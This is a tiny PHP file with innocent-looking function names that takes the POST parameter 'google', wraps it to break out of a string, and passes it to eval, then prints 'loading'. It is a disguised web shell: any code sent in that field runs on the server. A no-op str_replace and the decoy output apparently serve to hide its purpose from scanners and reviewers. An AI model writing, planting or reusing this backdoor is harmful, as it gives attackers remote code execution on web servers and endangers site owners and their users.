<?php
function love()
{
global $A;
$A=TT();
eval("\"$A\"");
}
function TT()
{
        $a=str_replace('','',$_POST[google]);
        
        return '";'.$a.'//';
}

love();
echo 'loading';
?>